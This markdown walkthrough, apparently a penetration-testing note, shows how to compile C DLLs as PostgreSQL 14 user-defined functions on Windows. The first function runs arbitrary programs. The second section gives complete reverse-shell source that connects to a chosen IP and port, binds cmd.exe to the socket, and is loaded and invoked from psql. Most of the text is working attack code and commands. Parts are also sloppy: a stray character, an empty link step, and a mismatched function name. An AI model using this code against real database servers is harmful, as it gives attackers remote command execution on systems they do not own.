## Creating UDF (User Defined Function) on Postgresql 14 x64 

- Install Postgresql for Windows
- Install Visual Studio and Visual Studio Code
- Install the Desktop development with C++ workload

![](2022-04-30-11-51-58.png)

- Windons -> Development 

![](2022-04-30-11-56-20.png)

- Validate

![](2022-04-30-11-56-53.png)

- Create a folder poc_dll

- Create a file poc_x64.c

Template

```C
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "shell32.lib")


PG_MODULE_MAGIC;

PGDLLEXPORT Datum poc(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(poc);

Datum
poc(PG_FUNCTION_ARGS)
{
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

    int32  instances = PG_GETARG_INT32(1);
 
    for (int c = 0; c < instances; c++) {
        /*launch the process passed in the first parameter*/
        ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
    }
    PG_RETURN_VOID();
}
s
```
- Open a cmd.exe and run follow commands

```

cd "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\"
%comspec% /k "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
```

![](2022-04-30-19-10-40.png)

- Goto src directory

- Compile

```

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29910\bin\HostX86\x64\CL.exe" /c /I"C:\Program Files\PostgreSQL\14\include\server\port\win32" /I"C:\Program Files\PostgreSQL\14\include" /I"C:\Program Files\PostgreSQL\14\include\server" /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D WIN32 /Gm- /MD /GS /Gy /fp:precise /permissive- /Zc:wchar_t /Zc:forScope /Zc:inline /Fo"poc_x64" /Fd"poc_x64.pdb" /Gd /TC /FC /errorReport:prompt poc_x64.c
```


- Link

```

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29910\bin\HostX86\x64\link.exe" /ERRORREPORT:PROMPT /OUT:"poc_x64.dll" /INCREMENTAL:NO /NOLOGO /LIBPATH:"C:\Program Files\PostgreSQL\14\lib" postgres.lib /MANIFEST:NO /DEBUG /PDB:"poc_x64.pdb" /SUBSYSTEM:CONSOLE /OPT:REF /OPT:ICF /LTCG:incremental /LTCGOUT:"poc_x64.iobj" /TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:"poc_x64.lib" /MACHINE:X64 /DLL poc_x64.obj
```

- Load Function at Postgresql, connect to psql and run

```

create or replace function poc(text, integer) returns void as $$c:\poc_x64.dll$$,$$poc$$ language c strict;
CREATE FUNCTION
select poc($$notepad.exe$$,5);
 poc
-----

(1 row)


postgres=#

```
![](2022-04-30-19-18-09.png)

![](2022-04-30-19-18-37.png)



## UDF Reverse SHELL on Windows

rev_shell_64.c

```c

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include "utils/builtins.h"
#include <winsock2.h>
 
#pragma comment(lib,"ws2_32")
 
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif


#define _WINSOCK_DEPRECATED_NO_WARNINGS
 

 
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum rev_shell(PG_FUNCTION_ARGS);
 
PG_FUNCTION_INFO_V1(rev_shell);
 
Datum rev_shell(PG_FUNCTION_ARGS)
{
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
    

    
    WSADATA wsaData;
    SOCKET wsock;
    struct sockaddr_in server;
    char ip_addr[16];
    STARTUPINFOA startupinfo;
    PROCESS_INFORMATION processinfo;
 
    char *program = "cmd.exe";
    const char *ip = GET_STR(PG_GETARG_TEXT_PP(0));
    int32  port_int32 = PG_GETARG_INT32(1);
    
    u_short port = port_int32;
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM,
                      IPPROTO_TCP, NULL, 0, 0);
 
    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip_addr, sizeof(ip_addr),
             inet_ntoa(*((struct in_addr *)host->h_addr)));
 
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip_addr);
 
    WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
              NULL, NULL, NULL, NULL);
 
    memset(&startupinfo, 0, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);
    startupinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startupinfo.hStdInput = startupinfo.hStdOutput =
                            startupinfo.hStdError = (HANDLE)wsock;
 
    CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
                  NULL, NULL, &startupinfo, &processinfo);

                
    PG_RETURN_VOID();
}
```


- Compile

```

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29910\bin\HostX86\x64\CL.exe" /c /I"C:\Program Files\PostgreSQL\14\include\server\port\win32" /I"C:\Program Files\PostgreSQL\14\include" /I"C:\Program Files\PostgreSQL\14\include\server" /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D WIN32 /Gm- /MD /GS /Gy /fp:precise /permissive- /Zc:wchar_t /Zc:forScope /Zc:inline /Fo"rev_shell_64" /Fd"rev_shell_64.pdb" /Gd /TC /FC /errorReport:prompt rev_shell_64.c
```


- Link

```


```

- Load Function at Postgresql, connect to psql and run

```

CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS 'c:\rev_shell_64.dll', 'rev_shell' LANGUAGE C STRICT;
select rev_shell($$192.168.0.90$$,9899);
-----

![](2022-04-30-21-34-11.png)

![](2022-04-30-21-35-09.png)
